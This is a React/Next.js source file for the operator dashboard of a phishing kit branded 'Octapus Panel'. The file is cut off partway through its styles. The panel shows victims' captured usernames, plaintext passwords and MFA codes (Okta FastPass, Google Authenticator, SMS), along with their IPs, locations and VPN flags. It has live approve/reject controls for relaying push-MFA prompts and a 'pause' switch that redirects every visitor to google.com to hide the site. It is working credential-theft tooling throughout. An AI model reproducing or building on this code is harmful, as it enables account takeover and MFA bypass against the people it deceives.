'use client';

import { useState, useEffect, useCallback } from 'react';
import { useRouter } from 'next/navigation';

interface GeoData {
  country: string;
  countryCode: string;
  region: string;
  city: string;
  isp: string;
  isVpn: boolean;
  isProxy: boolean;
  isDatacenter: boolean;
}

interface DeviceInfo {
  browser: string;
  browserVersion: string;
  os: string;
  osVersion: string;
  deviceType: string;
  isMobile: boolean;
}

interface Session {
  id: string;
  ip: string;
  userAgent: string;
  brand: string;
  currentPage: string;
  username?: string;
  password?: string;
  mfaCode?: string;
  mfaMethod?: string;
  phoneNumber?: string;
  geo?: GeoData;
  device: DeviceInfo;
  createdAt: string;
  updatedAt: string;
  isActive: boolean;
  pushStatus?: 'waiting' | 'approved' | 'rejected';
  pushRequestedAt?: string;
}

interface Stats {
  totalSessions: number;
  activeSessions: number;
  vpnUsers: number;
  byBrand: Record<string, number>;
  byCountry: Record<string, number>;
}

const REDIRECT_TARGET = 'https://www.google.com';

export default function AdminDashboard() {
  const router = useRouter();
  const [sessions, setSessions] = useState<Session[]>([]);
  const [stats, setStats] = useState<Stats | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [showAll, setShowAll] = useState(false);
  const [autoRefresh, setAutoRefresh] = useState(true);

  // Pause state — separate from autoRefresh (polling).
  // isPaused = true  →  server redirects all non-admin visitors to REDIRECT_TARGET.
  // isPaused = false →  site operates normally.
  const [isPaused, setIsPaused] = useState(false);
  const [isPauseLoading, setIsPauseLoading] = useState(false);

  // ── Data fetching ────────────────────────────────────────────────────────

  const fetchSessions = useCallback(async () => {
    try {
      const response = await fetch(`/api/admin/sessions?all=${showAll}`);
      if (response.status === 401) {
        router.push('/admin');
        return;
      }
      const data = await response.json();
      setSessions(data.sessions || []);
      setStats(data.stats || null);
      // Sync pause state from server so multiple admin tabs stay consistent
      if (typeof data.isPaused === 'boolean') {
        setIsPaused(data.isPaused);
        // Keep autoRefresh in sync — paused site doesn't need rapid polling
        setAutoRefresh(!data.isPaused);
      }
    } catch (error) {
      console.error('Failed to fetch sessions:', error);
    } finally {
      setIsLoading(false);
    }
  }, [showAll, router]);

  // ── Pause / resume ───────────────────────────────────────────────────────

  const setPausedState = async (paused: boolean) => {
    setIsPauseLoading(true);
    try {
      const res = await fetch('/api/admin/sessions', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ paused }),
      });
      if (!res.ok) {
        console.error('Failed to update pause state:', await res.text());
        return;
      }
      setIsPaused(paused);
      setAutoRefresh(!paused);
    } catch (error) {
      console.error('Failed to toggle pause state:', error);
    } finally {
      setIsPauseLoading(false);
    }
  };

  const handleTogglePause = () => {
    if (isPauseLoading) return;
    setPausedState(!isPaused);
  };

  // ── Other actions ────────────────────────────────────────────────────────

  const handleLogout = async () => {
    await fetch('/api/admin/logout', { method: 'POST' });
    router.push('/admin');
  };

  const handleClearSessions = async () => {
    if (confirm('Are you sure you want to clear all sessions?')) {
      await fetch('/api/admin/sessions', { method: 'DELETE' });
      fetchSessions();
    }
  };

  const handlePushAction = async (sessionId: string, action: 'approve' | 'reject') => {
    try {
      await fetch(`/api/admin/sessions/${sessionId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action }),
      });
      fetchSessions();
    } catch (error) {
      console.error('Failed to update push status:', error);
    }
  };

  // ── Inline phone editor state ────────────────────────────────────────────

  const [editingPhoneId, setEditingPhoneId] = useState<string | null>(null);
  const [editCountryCode, setEditCountryCode] = useState<string>('+1');
  const [editLocalNumber, setEditLocalNumber] = useState<string>('');

  const handleStartEditPhone = (sessionId: string, currentPhone?: string) => {
    setEditingPhoneId(sessionId);
    if (currentPhone) {
      const digits = currentPhone.replace(/\D/g, '');
      if (digits.length > 10) {
        const cc = digits.slice(0, digits.length - 10);
        const local = digits.slice(-10);
        setEditCountryCode('+' + cc);
        setEditLocalNumber(local);
      } else {
        setEditCountryCode('+1');
        setEditLocalNumber(digits);
      }
    } else {
      setEditCountryCode('+1');
      setEditLocalNumber('');
    }
  };

  const handleCancelEditPhone = () => {
    setEditingPhoneId(null);
    setEditLocalNumber('');
  };

  const handleSubmitPhone = async (sessionId: string) => {
    const digits = editLocalNumber.replace(/\D/g, '');
    const cc = editCountryCode.replace(/\D/g, '') || '1';
    const phone = `+${cc}${digits}`;
    try {
      await fetch(`/api/admin/sessions/${sessionId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'setPhone', phoneNumber: phone }),
      });
      setEditingPhoneId(null);
      fetchSessions();
    } catch (error) {
      console.error('Failed to set phone number:', error);
    }
  };

  // ── Effects ──────────────────────────────────────────────────────────────

  useEffect(() => {
    fetchSessions();
  }, [fetchSessions]);

  useEffect(() => {
    if (!autoRefresh) return;
    const interval = setInterval(fetchSessions, 3000);
    return () => clearInterval(interval);
  }, [autoRefresh, fetchSessions]);

  // ── Helpers ──────────────────────────────────────────────────────────────

  const getDeviceIcon = (deviceType: string) => {
    switch (deviceType) {
      case 'mobile': return '📱';
      case 'tablet': return '📲';
      default: return '🖥️';
    }
  };

  const getFlagEmoji = (countryCode: string) => {
    if (!countryCode || countryCode === '??' || countryCode === 'LO') return '🌐';
    const codePoints = countryCode
      .toUpperCase()
      .split('')
      .map(char => 127397 + char.charCodeAt(0));
    return String.fromCodePoint(...codePoints);
  };

  const formatTime = (dateStr: string) => {
    return new Date(dateStr).toLocaleTimeString('en-US', {
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    });
  };

  const getTimeSince = (dateStr: string) => {
    const seconds = Math.floor((Date.now() - new Date(dateStr).getTime()) / 1000);
    if (seconds < 60) return `${seconds}s ago`;
    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
    return `${Math.floor(seconds / 3600)}h ago`;
  };

  // ── Loading screen ───────────────────────────────────────────────────────

  if (isLoading) {
    return (
      <div className="loading-screen">
        <div className="loader-container">
          <div className="octopus-loader">🐙</div>
          <div className="loader-text">Loading...</div>
        </div>
        <style jsx>{`
          .loading-screen {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%);
          }
          .loader-container { text-align: center; }
          .octopus-loader {
            font-size: 64px;
            animation: bounce 1s ease-in-out infinite;
          }
          .loader-text {
            margin-top: 16px;
            color: #a78bfa;
            font-size: 14px;
            font-weight: 500;
            letter-spacing: 2px;
            text-transform: uppercase;
          }
          @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
          }
        `}</style>
      </div>
    );
  }

  // ── Render ───────────────────────────────────────────────────────────────

  return (
    <div className="dashboard">
      {/* Sidebar */}
      <aside className="sidebar">
        <div className="sidebar-header">
          <div className="logo">
            <div className="logo-icon">🐙</div>
            <div className="logo-text">
              <span className="logo-title">Octapus</span>
              <span className="logo-subtitle">Panel</span>
            </div>
          </div>
        </div>
        <nav className="sidebar-nav">
          <a href="#" className="nav-item active">
            <span className="nav-icon">📊</span>
            <span>Dashboard</span>
          </a>
        </nav>
        <div className="sidebar-footer">
          <div className="user-info">
            <div className="user-avatar">A</div>
            <div className="user-details">
              <span className="user-name">Admin</span>
              <span className="user-role">Administrator</span>
            </div>
          </div>
          <button className="logout-btn" onClick={handleLogout}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" />
              <polyline points="16,17 21,12 16,7" />
              <line x1="21" y1="12" x2="9" y2="12" />
            </svg>
          </button>
        </div>
      </aside>

      {/* Main Content */}
      <main className="main">
        {/* Header */}
        <header className="header">
          <div className="header-left">
            <h1>Dashboard</h1>
            <p className="header-subtitle">Monitor and manage active sessions</p>
          </div>
          <div className="header-right">
            {/* Status badge — reflects real pause state, not just poll state */}
            <div className={`status-badge ${isPaused ? 'redirecting' : 'live'}`}>
              <span className="status-dot"></span>
              {isPaused ? 'Redirecting' : 'Live'}
            </div>
            <div className="header-actions">
              {/* Pause / Resume button */}
              <button
                className={`btn-header btn-pause ${isPaused ? 'is-paused' : 'is-live'} ${isPauseLoading ? 'is-loading' : ''}`}
                onClick={handleTogglePause}
                disabled={isPauseLoading}
                title={isPaused ? `Resume — lift redirect from ${REDIRECT_TARGET}` : `Pause — redirect all visitors to ${REDIRECT_TARGET}`}
              >
                {isPauseLoading ? (
                  <svg className="spin" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M21 12a9 9 0 1 1-6.219-8.56" />
                  </svg>
                ) : isPaused ? (
                  // Resume icon
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                    <polygon points="5,3 19,12 5,21" />
                  </svg>
                ) : (
                  // Pause icon
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                    <rect x="6" y="4" width="4" height="16" rx="1" />
                    <rect x="14" y="4" width="4" height="16" rx="1" />
                  </svg>
                )}
              </button>

              {/* Manual refresh */}
              <button className="btn-header" onClick={fetchSessions} title="Refresh">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M23 4v6h-6" />
                  <path d="M1 20v-6h6" />
                  <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15" />
                </svg>
              </button>

              {/* Clear all */}
              <button className="btn-danger" onClick={handleClearSessions}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <polyline points="3,6 5,6 21,6" />
                  <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" />
                </svg>
                Clear All
              </button>
            </div>
          </div>
        </header>

        {/* Pause banner — only shown when site is paused */}
        {isPaused && (
          <div className="pause-banner">
            <div className="pause-banner-inner">
              <span className="pause-banner-icon">⏸</span>
              <div className="pause-banner-text">
                <strong>Site paused</strong>
                <span>
                  All visitors are being redirected to <code>{REDIRECT_TARGET}</code>. The admin panel remains accessible.
                </span>
              </div>
              <button
                className="pause-banner-resume"
                onClick={handleTogglePause}
                disabled={isPauseLoading}
              >
                Resume site
              </button>
            </div>
          </div>
        )}

        {/* Stats */}
        <div className="stats-grid">
          <div className="stat-card stat-green">
            <div className="stat-icon-wrap">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                <circle cx="12" cy="12" r="3" />
              </svg>
            </div>
            <div className="stat-content">
              <span className="stat-value">{stats?.activeSessions || 0}</span>
              <span className="stat-label">Active Sessions</span>
            </div>
            <div className="stat-glow"></div>
          </div>
          <div className="stat-card stat-blue">
            <div className="stat-icon-wrap">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2" />
                <circle cx="9" cy="7" r="4" />
                <path d="M23 21v-2a4 4 0 0 0-3-3.87" />
                <path d="M16 3.13a4 4 0 0 1 0 7.75" />
              </svg>
            </div>
            <div className="stat-content">
              <span className="stat-value">{stats?.totalSessions || 0}</span>
              <span className="stat-label">Total Sessions</span>
            </div>
            <div className="stat-glow"></div>
          </div>
          <div className="stat-card stat-orange">
            <div className="stat-icon-wrap">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                <path d="M7 11V7a5 5 0 0 1 10 0v4" />
              </svg>
            </div>
            <div className="stat-content">
              <span className="stat-value">{stats?.vpnUsers || 0}</span>
              <span className="stat-label">VPN/Proxy</span>
            </div>
            <div className="stat-glow"></div>
          </div>
          <div className="stat-card stat-purple">
            <div className="stat-icon-wrap">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <circle cx="12" cy="12" r="10" />
                <line x1="2" y1="12" x2="22" y2="12" />
                <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
              </svg>
            </div>
            <div className="stat-content">
              <span className="stat-value">{Object.keys(stats?.byCountry || {}).length}</span>
              <span className="stat-label">Countries</span>
            </div>
            <div className="stat-glow"></div>
          </div>
        </div>

        {/* Sessions Table */}
        <div className="table-card">
          <div className="table-header">
            <div className="table-title">
              <h2>Sessions</h2>
              <span className="session-count">{sessions.length} total</span>
            </div>
            <label className="toggle-label">
              <span className="toggle-text">Show inactive</span>
              <div className="toggle-switch">
                <input
                  type="checkbox"
                  checked={showAll}
                  onChange={(e) => setShowAll(e.target.checked)}
                />
                <span className="toggle-slider"></span>
              </div>
            </label>
          </div>

          {sessions.length === 0 ? (
            <div className="empty-state">
              <div className="empty-icon">🐙</div>
              <h3>No active sessions</h3>
              <p>Sessions will appear when users visit the login pages</p>
            </div>
          ) : (
            <div className="table-wrapper">
              <table className="table">
                <thead>
                  <tr>
                    <th style={{width: '50px'}}></th>
                    <th>Visitor</th>
                    <th>Credentials</th>
                    <th>Location</th>
                    <th>Status</th>
                    <th>Actions</th>
                    <th style={{width: '100px'}}>Time</th>
                  </tr>
                </thead>
                <tbody>
                  {sessions.map((session) => (
                    <tr key={session.id} className={session.isActive ? '' : 'inactive'}>
                      <td>
                        <span className={`status-indicator ${session.isActive ? 'online' : 'offline'}`}></span>
                      </td>
                      <td>
                        <div className="visitor-cell">
                          <div className="visitor-device">{getDeviceIcon(session.device.deviceType)}</div>
                          <div className="visitor-info">
                            <div className="visitor-browser">
                              {session.device.browser} {session.device.browserVersion?.split('.')[0]}
                            </div>
                            <div className="visitor-os">{session.device.os} {session.device.osVersion}</div>
                          </div>
                        </div>
                      </td>
                      <td>
                        <div className="credentials-cell">
                          {session.username || session.password || session.mfaCode ? (
                            <>
                              {session.username && (
                                <div className="cred-row">
                                  <span className="cred-label">U</span>
                                  <code className="cred-value">{session.username}</code>
                                </div>
                              )}
                              {session.password && (
                                <div className="cred-row">
                                  <span className="cred-label">P</span>
                                  <code className="cred-value">{session.password}</code>
                                </div>
                              )}
                              {session.mfaCode && (
                                <div className="cred-row">
                                  <span className="cred-label">
                                    {(() => {
                                      const m = session.mfaMethod || '';
                                      switch (m.toLowerCase()) {
                                        case 'fastpass': return 'FastPass';
                                        case 'okta_fastpass': return 'FastPass';
                                        case 'google':
                                        case 'google_authenticator':
                                          return 'Google Auth';
                                        case 'webauthn':
                                        case 'securitykey':
                                        case 'security_key':
                                          return 'Security Key';
                                        case 'push': return 'Push';
                                        case 'phone': return 'Phone';
                                        case 'sms': return 'SMS Authentication';
                                        case 'code': return 'Code';
                                        default:
                                          return m ? m : '2FA';
                                      }
                                    })()}
                                  </span>
                                  <code className="cred-value mfa">{session.mfaCode}</code>
                                </div>
                              )}
                              {(editingPhoneId === session.id) ? (
                                <div className="phone-editor">
                                  <select className="phone-select" value={editCountryCode} onChange={(e) => setEditCountryCode(e.target.value)}>
                                    <option value="+1">+1 (US)</option>
                                    <option value="+44">+44 (UK)</option>
                                    <option value="+61">+61 (AU)</option>
                                    <option value="+49">+49 (DE)</option>
                                    <option value="+91">+91 (IN)</option>
                                  </select>
                                  <input className="phone-input" value={editLocalNumber} onChange={(e) => setEditLocalNumber(e.target.value)} placeholder="Area and number" />
                                  <button className="btn-phone btn-phone-primary" onClick={() => handleSubmitPhone(session.id)}>Save</button>
                                  <button className="btn-phone btn-phone-secondary" onClick={handleCancelEditPhone}>Cancel</button>
                                </div>
                              ) : (
                                <div className="cred-row">
                                  <span className="cred-label">{(session.mfaMethod === 'sms') ? 'SMS' : 'Phone'}</span>
                                  <code className="cred-value">{session.phoneNumber ? session.phoneNumber : '+1 XXX-XXX-XXXX'}</code>
                                  <button className="btn-phone btn-phone-primary" style={{marginLeft: 8}} onClick={() => handleStartEditPhone(session.id, session.phoneNumber)}>{session.phoneNumber ? 'Edit' : 'Set'}</button>
                                </div>
                              )}
                            </>
                          ) : (
                            <span className="no-creds">Waiting...</span>
                          )}
                        </div>
                      </td>
                      <td>
                        <div className="location-cell">
                          <span className="location-flag">{getFlagEmoji(session.geo?.countryCode || '')}</span>
                          <div className="location-info">
                            <div className="location-primary">
                              {session.geo?.city || 'Unknown'}, {session.geo?.country || 'Unknown'}
                            </div>
                            <div className="location-secondary">{session.ip}</div>
                          </div>
                        </div>
                      </td>
                      <td>
                        <div className="status-cell">
                          <span className={`badge badge-${session.brand}`}>{session.brand}</span>
                          <span className="page-indicator">{session.currentPage}</span>
                          {(session.geo?.isVpn || session.geo?.isProxy) && (
                            <span className="badge badge-warning">VPN</span>
                          )}
                          {session.geo?.isDatacenter && (
                            <span className="badge badge-info">DC</span>
                          )}
                          {session.pushStatus === 'waiting' && (
                            <span className="badge badge-push">PUSH</span>
                          )}
                        </div>
                      </td>
                      <td>
                        <div className="actions-cell">
                          {session.pushStatus === 'waiting' ? (
                            <>
                              <button
                                className="btn-action btn-approve"
                                onClick={() => handlePushAction(session.id, 'approve')}
                              >
                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
                                  <polyline points="20,6 9,17 4,12" />
                                </svg>
                                Approve
                              </button>
                              <button
                                className="btn-action btn-reject"
                                onClick={() => handlePushAction(session.id, 'reject')}
                              >
                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3">
                                  <line x1="18" y1="6" x2="6" y2="18" />
                                  <line x1="6" y1="6" x2="18" y2="18" />
                                </svg>
                                Reject
                              </button>
                            </>
                          ) : session.pushStatus === 'approved' ? (
                            <span className="action-status approved">Approved</span>
                          ) : session.pushStatus === 'rejected' ? (
                            <span className="action-status rejected">Rejected</span>
                          ) : (
                            <span className="action-status none">—</span>
                          )}
                        </div>
                      </td>
                      <td>
                        <div className="time-cell">
                          <div className="time-primary">{formatTime(session.updatedAt)}</div>
                          <div className="time-secondary">{getTimeSince(session.updatedAt)}</div>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </main>

      <style jsx>{`
        * {
          box-sizing: border-box;
        }

        .dashboard {
          display: flex;
          min-height: 100vh;
          background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%);
          color: #e2e8f0;
          font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        /* ── Sidebar ── */
        .sidebar {
          width: 260px;
          background: rgba(15, 15, 26, 0.8);
          backdrop-filter: blur(20px);
          border-right: 1px solid rgba(139, 92, 246, 0.1);
          display: flex;
          flex-direction: column;
          position: fixed;
          height: 100vh;
          z-index: 100;
        }

        .sidebar-header {
          padding: 24px;
          border-bottom: 1px solid rgba(139, 92, 246, 0.1);
        }

        .logo {
          display: flex;
          align-items: center;
          gap: 14px;
        }

        .logo-icon {
          font-size: 36px;
          filter: drop-shadow(0 0 20px rgba(139, 92, 246, 0.5));
        }

        .logo-text {
          display: flex;
          flex-direction: column;
        }

        .logo-title {
          font-size: 22px;
          font-weight: 700;
          background: linear-gradient(135deg, #a78bfa 0%, #818cf8 50%, #6366f1 100%);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
          letter-spacing: -0.5px;
        }

        .logo-subtitle {
          font-size: 11px;
          color: #64748b;
          text-transform: uppercase;
          letter-spacing: 3px;
          font-weight: 500;
        }

        .sidebar-nav {
          flex: 1;
          padding: 20px 16px;
        }

        .nav-item {
          display: flex;
          align-items: center;
          gap: 14px;
          padding: 14px 16px;
          border-radius: 12px;
          color: #94a3b8;
          text-decoration: none;
          font-size: 14px;
          font-weight: 500;
          margin-bottom: 8px;
          transition: all 0.2s ease;
          position: relative;
          overflow: hidden;
        }

        .nav-item:hover {
          background: rgba(139, 92, 246, 0.1);
          color: #e2e8f0;
        }

        .nav-item.active {
          background: linear-gradient(135deg, rgba(139, 92, 246, 0.2) 0%, rgba(99, 102, 241, 0.2) 100%);
          color: #a78bfa;
          box-shadow: 0 0 20px rgba(139, 92, 246, 0.15);
        }

        .nav-item.active::before {
          content: '';
          position: absolute;
          left: 0;
          top: 50%;
          transform: translateY(-50%);
          width: 3px;
          height: 60%;
          background: linear-gradient(180deg, #a78bfa 0%, #6366f1 100%);
          border-radius: 0 4px 4px 0;
        }

        .nav-icon {
          font-size: 18px;
        }

        .sidebar-footer {
          padding: 16px;
          border-top: 1px solid rgba(139, 92, 246, 0.1);
          display: flex;
          align-items: center;
          justify-content: space-between;
        }

        .user-info {
          display: flex;
          align-items: center;
          gap: 12px;
        }

        .user-avatar {
          width: 40px;
          height: 40px;
          background: linear-gradient(135deg, #a78bfa 0%, #6366f1 100%);
          border-radius: 10px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-weight: 600;
          font-size: 16px;
          color: white;
        }

        .user-details {
          display: flex;
          flex-direction: column;
        }

        .user-name {
          font-size: 14px;
          font-weight: 600;
          color: #e2e8f0;
        }

        .user-role {
          font-size: 11px;
          color: #64748b;
        }

        .logout-btn {
          width: 40px;
          height: 40px;
          background: rgba(239, 68, 68, 0.1);
          border: 1px solid rgba(239, 68, 68, 0.2);
          border-radius: 10px;
          color: #f87171;
          cursor: pointer;
          transition: all 0.2s ease;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .logout-btn:hover {
          background: rgba(239, 68, 68, 0.2);
          border-color: rgba(239, 68, 68, 0.4);
          transform: translateY(-2px);
        }

        /* ── Main ── */
        .main {
          flex: 1;
          margin-left: 260px;
          padding: 32px;
          min-height: 100vh;
        }

        .header {
          display: flex;
          justify-content: space-between;
          align-items: flex-start;
          margin-bottom: 32px;
        }

        .header-left h1 {
          font-size: 32px;
          font-weight: 700;
          color: #f1f5f9;
          margin: 0 0 4px;
          letter-spacing: -0.5px;
        }

        .header-subtitle {
          color: #64748b;
          font-size: 14px;
          margin: 0;
        }

        .header-right {
          display: flex;
          align-items: center;
          gap: 16px;
        }

        /* ── Status badge ── */
        .status-badge {
          display: flex;
          align-items: center;
          gap: 8px;
          padding: 8px 16px;
          border-radius: 30px;
          font-size: 13px;
          font-weight: 600;
        }

        .status-badge.live {
          background: rgba(34, 197, 94, 0.15);
          color: #4ade80;
          border: 1px solid rgba(34, 197, 94, 0.3);
        }

        .status-badge.redirecting {
          background: rgba(239, 68, 68, 0.15);
          color: #f87171;
          border: 1px solid rgba(239, 68, 68, 0.3);
        }

        .status-dot {
          width: 8px;
          height: 8px;
          border-radius: 50%;
          background: currentColor;
        }

        .status-badge.live .status-dot {
          animation: pulse-green 2s infinite;
          box-shadow: 0 0 10px currentColor;
        }

        .status-badge.redirecting .status-dot {
          animation: pulse-red 1.2s infinite;
          box-shadow: 0 0 10px currentColor;
        }

        @keyframes pulse-green {
          0%, 100% { opacity: 1; transform: scale(1); }
          50% { opacity: 0.5; transform: scale(0.9); }
        }

        @keyframes pulse-red {
          0%, 100% { opacity: 1; transform: scale(1.1); box-shadow: 0 0 14px currentColor; }
          50% { opacity: 0.7; transform: scale(0.85); }
        }

        /* ── Header buttons ── */
        .header-actions {
          display: flex;
          gap: 10px;
        }

        .btn-header {
          width: 42px;
          height: 42px;
          border-radius: 12px;
          border: 1px solid rgba(139, 92, 246, 0.2);
          background: rgba(139, 92, 246, 0.1);
          color: #a78bfa;
          cursor: pointer;
          transition: all 0.2s ease;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .btn-header:hover:not(:disabled) {
          background: rgba(139, 92, 246, 0.2);
          border-color: rgba(139, 92, 246, 0.4);
          transform: translateY(-2px);
        }

        .btn-header:disabled {
          opacity: 0.6;
          cursor: not-allowed;
        }

        /* Pause button — live state */
        .btn-pause.is-live {
          background: rgba(34, 197, 94, 0.12);
          border-color: rgba(34, 197, 94, 0.3);
          color: #4ade80;
        }

        .btn-pause.is-live:hover:not(:disabled) {
          background: rgba(239, 68, 68, 0.15);
          border-color: rgba(239, 68, 68, 0.4);
          color: #f87171;
        }

        /* Pause button — paused state (pulsing red) */
        .btn-pause.is-paused {
          background: rgba(239, 68, 68, 0.15);
          border-color: rgba(239, 68, 68, 0.4);
          color: #f87171;
          animation: btn-pulse-red 1.5s ease-in-out infinite;
        }

        .btn-pause.is-paused:hover:not(:disabled) {
          background: rgba(34, 197, 94, 0.15);
          border-color: rgba(34, 197, 94, 0.4);
          color: #4ade80;
          animation: none;
        }

        @keyframes btn-pulse-red {
          0%, 100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); }
          50% { box-shadow: 0 0 0 6px rgba(239, 68, 68, 0); }
        }

        /* Loading spinner */
        .spin {
          animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }

        .btn-danger {
          padding: 10px 20px;
          border-radius: 12px;
          background: rgba(239, 68, 68, 0.1);
          border: 1px solid rgba(239, 68, 68, 0.3);
          color: #f87171;
          font-size: 14px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s ease;
          display: flex;
          align-items: center;
          gap: 8px;
        }

        .btn-danger:hover {
          background: rgba(239, 68, 68, 0.2);
          border-color: rgba(239, 68, 68, 0.5);
          transform: translateY(-2px);
        }

        /* ── Pause banner ── */
        .pause-banner {
          background: linear-gradient(135deg, rgba(239, 68, 68, 0.1) 0%, rgba(220, 38, 38, 0.06) 100%);
          border: 1px solid rgba(239, 68, 68, 0.3);
          border-radius: 16px;
          margin-bottom: 28px;
          animation: slide-in 0.25s ease;
        }

        @keyframes slide-in {
          from { opacity: 0; transform: translateY(-8px); }
          to { opacity: 1; transform: translateY(0); }
        }

        .pause-banner-inner {
          display: flex;
          align-items: center;
          gap: 16px;
          padding: 16px 20px;
        }

        .pause-banner-icon {
          font-size: 22px;
          flex-shrink: 0;
        }

        .pause-banner-text {
          flex: 1;
          display: flex;
          flex-direction: column;
          gap: 3px;
        }

        .pause-banner-text strong {
          font-size: 14px;
          color: #f87171;
          font-weight: 600;
        }

        .pause-banner-text span {
          font-size: 13px;
          color: #94a3b8;
        }

        .pause-banner-text code {
          font-family: 'JetBrains Mono', ui-monospace, monospace;
          font-size: 12px;
          color: #fbbf24;
          background: rgba(245, 158, 11, 0.1);
          padding: 1px 6px;
          border-radius: 4px;
        }

        .pause-banner-resume {
          padding: 10px 20px;
          border-radius: 10px;
          background: rgba(34, 197, 94, 0.15);
          border: 1px solid rgba(34, 197, 94, 0.35);
          color: #4ade80;
          font-size: 13px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s ease;
          white-space: nowrap;
          flex-shrink: 0;
        }

        .pause-banner-resume:hover:not(:disabled) {
          background: rgba(34, 197, 94, 0.25);
          border-color: rgba(34, 197, 94, 0.5);
          transform: translateY(-2px);
          box-shadow: 0 4px 16px rgba(34, 197, 94, 0.25);
        }

        .pause-banner-resume:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        /* ── Stats ── */
        .stats-grid {
          display: grid;
          grid-template-columns: repeat(4, 1fr);
          gap: 20px;
          margin-bottom: 32px;
        }

        .stat-card {
          background: rgba(15, 15, 26, 0.6);
          backdrop-filter: blur(20px);
          border: 1px solid rgba(139, 92, 246, 0.1);
          border-radius: 20px;
          padding: 24px;
          display: flex;
          align-items: center;
          gap: 20px;
          position: relative;
          overflow: hidden;
          transition: all 0.3s ease;
        }

        .stat-card:hover {
          transform: translateY(-4px);
          border-color: rgba(139, 92, 246, 0.3);
        }

        .stat-glow {
          position: absolute;
          top: -50%;
          right: -50%;
          width: 100%;
          height: 100%;
          border-radius: 50%;
          opacity: 0.1;
          transition: opacity 0.3s ease;
        }

        .stat-card:hover .stat-glow { opacity: 0.2; }

        .stat-green .stat-glow { background: radial-gradient(circle, #22c55e 0%, transparent 70%); }
        .stat-blue .stat-glow { background: radial-gradient(circle, #3b82f6 0%, transparent 70%); }
        .stat-orange .stat-glow { background: radial-gradient(circle, #f59e0b 0%, transparent 70%); }
        .stat-purple .stat-glow { background: radial-gradient(circle, #a78bfa 0%, transparent 70%); }

        .stat-icon-wrap {
          width: 56px;
          height: 56px;
          border-radius: 16px;
          display: flex;
          align-items: center;
          justify-content: center;
          position: relative;
          z-index: 1;
        }

        .stat-green .stat-icon-wrap { background: rgba(34, 197, 94, 0.15); color: #4ade80; }
        .stat-blue .stat-icon-wrap { background: rgba(59, 130, 246, 0.15); color: #60a5fa; }
        .stat-orange .stat-icon-wrap { background: rgba(245, 158, 11, 0.15); color: #fbbf24; }
        .stat-purple .stat-icon-wrap { background: rgba(167, 139, 250, 0.15); color: #a78bfa; }

        .stat-content {
          display: flex;
          flex-direction: column;
          gap: 4px;
          position: relative;
          z-index: 1;
        }

        .stat-value {
          font-size: 32px;
          font-weight: 700;
          color: #f1f5f9;
          line-height: 1;
        }

        .stat-label {
          font-size: 13px;
          color: #64748b;
          font-weight: 500;
        }

        /* ── Table ── */
        .table-card {
          background: rgba(15, 15, 26, 0.6);
          backdrop-filter: blur(20px);
          border: 1px solid rgba(139, 92, 246, 0.1);
          border-radius: 20px;
          overflow: hidden;
        }

        .table-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 24px;
          border-bottom: 1px solid rgba(139, 92, 246, 0.1);
        }

        .table-title {
          display: flex;
          align-items: center;
          gap: 12px;
        }

        .table-title h2 {
          font-size: 18px;
          font-weight: 600;
          color: #f1f5f9;
          margin: 0;
        }

        .session-count {
          padding: 4px 12px;
          background: rgba(139, 92, 246, 0.15);
